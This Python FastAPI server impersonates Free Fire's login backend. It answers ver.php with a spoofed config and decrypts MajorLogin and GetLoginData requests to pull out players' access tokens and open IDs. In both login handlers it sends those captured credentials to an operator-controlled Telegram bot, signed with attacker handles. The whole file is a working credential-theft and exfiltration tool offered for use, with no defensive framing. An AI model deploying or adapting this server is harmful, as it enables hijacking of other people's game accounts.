import httpx, uvicorn, json, os
from fastapi import FastAPI, Request
from fastapi.responses import Response, JSONResponse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from x7m import *

app = FastAPI()

# Render uses PORT environment variable
PORT = int(os.environ.get("PORT", 6677))
HOST = "0.0.0.0"

Key, Iv = b'Yg&tc%DEuh6%Zc^8', b'6oyZDr22E3ychjM%'

def EnC_AEs(HeX):
    cipher = AES.new(Key, AES.MODE_CBC, Iv)
    return cipher.encrypt(pad(HeX, AES.block_size)).hex()

def DEc_AEs(HeX):
    cipher = AES.new(Key, AES.MODE_CBC, Iv)
    return unpad(cipher.decrypt(HeX), AES.block_size).hex()

# Send to Telegram
def send_to_telegram(token, chat_id, message):
    try:
        import requests
        url = f'https://api.telegram.org/bot{token}/sendMessage'
        params = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        r = requests.post(url, data=params, timeout=10)
        if r.status_code == 200:
            print('✅ Sent to Telegram!')
        else:
            print(f'❌ Telegram error: {r.status_code}')
    except Exception as e:
        print(f"❌ Telegram error: {e}")

# Get token and chat_id from environment variables (for Render)
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

@app.api_route("/ver.php", methods=["GET", "POST"])
async def manual(request: Request):
    print("🔄 ver.php called")
    
    # Exact response from real server with code: 2
    response_data = {
        "code": 2,
        "use_login_optional_download": False,
        "use_background_download": False,
        "use_background_download_lobby": False,
        "country_code": "IN",
        "client_ip": request.client.host if request.client else "127.0.0.1",
        "gdpr_version": 0,
        "billboard_cdn_url": "",
        "billboard_msg": "",
        "web_url": "",
        "billboard_bg_url": "",
        "max_store": "",
        "max_web": "",
        "max_video": "",
        "patchnote_url": "",
        "multi_region": "",
        "appstore_url": "http://www.freefiremobile.com/",
        "backup_appstore_url": "",
        "garena_login": False,
        "garena_hint": False,
        "gop_url": "",
        "gamevar": "var_name,comment,var_type,var_value\nvar_name,comment,\"var_type float, int, bool\",var_value\nANODisabledRegions,\u5173\u95edMTP\u7684\u5730\u533a,string,\"IND,NA\"\nANODisabledClientVariant,ANODisabledClientVariant,string,\"ClientUsingVersion_MAX_HPE,ClientUsingVersion_FFI,ClientUsingVersion_MAX|IND,ClientUsingVersion_MAX|NA,ClientUsingVersion_NORMAL|NA\"\nEnableMtpLiteDataRegion,mtp\u8f7b\u7279\u5f81\u5f00\u5173,string,\"BR,EUROPE,ID,ME,US,RU,SAC,SG,TH,TW,VN,PK,ZA,BD\"\nANOEmulatorCheckDisbaledClientVariant,ANOEmulatorCheckDisbaledClientVariant,string,\"ClientUsingVersion_FFI,ClientUsingVersion_MAX,ClientUsingVersion_NORMAL\"\nForceTutorial_ChangeHudABTest,fps\u6d41\u7a0b\u4e2d\u6253\u5f00hud\u9009\u62e9\u754c\u9762\u7684\u6982\u7387,float,-1\n",
        "device_whitelist_version": "1.6.0",
        "whitelist_mask": 0,
        "device_whitelist_sp_version": "1.0.0",
        "whitelist_sp_mask": 0,
        "ggp_url": f"http://{request.headers.get('host', '127.0.0.1:6677')}"
    }
    
    print(f"📝 Returning ver.php with code: {response_data['code']}")
    return JSONResponse(content=response_data, status_code=200)

@app.api_route("/MajorLogin", methods=["POST"])
async def MajorLoginProxy(request: Request):
    print("🔥 MajorLogin received")
    PyL = await request.body()
    print(f"📦 Body length: {len(PyL)} bytes")
    
    try:
        x7m = json.loads(get_available_room(decrypt_api(PyL.hex())))
        acess_token = x7m.get("29", "NOT FOUND")
        open_id = x7m.get("22", "NOT FOUND")
        
        print(f"✅ Access Token: {acess_token}")
        print(f"✅ Open ID: {open_id}")
        
        # Send to Telegram if configured
        if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
            msg = f"""🎯 PARAHEX Login Successful!

Access Token: {acess_token}
Open ID: {open_id}

By: @redzedking | @iix1f
PARAHEX TOP 1 @parahex."""
            send_to_telegram(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, msg)
        
        # Return the banner
        nikomLhnoud = f""" [b][c][279CF5]

███████████╗░██████╗░██╗░░░██╗████████╗░█████╗░██████╗░
██╔══██╗██╔══██╗╚██╗░██╔╝╚══██╔══╝██╔══██╗██╔══██╗
██████╦╝██████╦╝░╚████╔╝░░░░██║░░░██║░░██║██████╔╝
██╔══██╗██╔══██╗░░╚██╔╝░░░░░██║░░░██║░░██║██╔═══╝░
██████╦╝██████╦╝░░░██║░░░░░░██║░░░╚█████╔╝██║░░░░░
╚═════╝░╚═════╝░░░░╚═╝░░░░░░╚═╝░░░░╚════╝░╚═╝░░░░░

─────────────────────────────────────

[cccccc]Access Token => [ff0000]{acess_token} [cccccc]| Open ID => [00ff00]{open_id}

[00ff00]TeLeGram => @BBYTOP3
"""

        return Response(
            content=nikomLhnoud,
            status_code=200,
            media_type="application/octet-stream"
        )
        
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()
        return Response(
            content="Error",
            status_code=200,
            media_type="application/octet-stream"
        )

@app.api_route("/GetLoginData", methods=["POST"])
async def GetLoginDataProxy(request: Request):
    print("📥 GetLoginData received")
    body = await request.body()
    print(f"📦 Body length: {len(body)} bytes")
    
    try:
        decrypted = get_available_room(decrypt_api(body.hex()))
        x7m = json.loads(decrypted)
        
        acess_token = x7m.get("29", "NOT FOUND")
        open_id = x7m.get("22", "NOT FOUND")
        
        if acess_token != "NOT FOUND":
            print(f"✅ Access Token: {acess_token}")
            print(f"✅ Open ID: {open_id}")
            
            if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
                msg = f"""🎯 GetLoginData Captured!

Access Token: {acess_token}
Open ID: {open_id}

By: @redzedking | @iix1f
PARAHEX TOP 1 @parahex."""
                send_to_telegram(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, msg)
    except Exception as e:
        print(f"⚠️ Could not decrypt: {e}")
    
    # Return encrypted success response
    success_response = {
        "status": "success",
        "message": "OK"
    }
    encrypted = EnC_AEs(json.dumps(success_response).encode())
    
    return Response(
        content=bytes.fromhex(encrypted),
        status_code=200,
        headers={
            "Content-Type": "application/octet-stream",
            "Connection": "close"
        }
    )

@app.api_route("/Ping", methods=["POST"])
async def ping():
    print("📥 Ping received")
    return Response(content=b"", status_code=200)

@app.api_route("/", methods=["GET"])
async def root():
    return JSONResponse({
        "status": "running",
        "server": "PARAHEX",
        "endpoints": ["/ver.php", "/MajorLogin", "/GetLoginData", "/Ping"]
    })

@app.api_route("/health", methods=["GET"])
async def health():
    return JSONResponse({"status": "healthy"})

# Catch all
@app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "PATCH"])
async def catch_all(request: Request, path: str):
    print(f"🔄 Catch-all: {path}")
    return Response(content=b"", status_code=200)

if __name__ == "__main__":
    print(f"\n🚀 Starting server on http://{HOST}:{PORT}")
    print("="*80 + "\n")
    uvicorn.run(app, host=HOST, port=PORT, log_level='info')
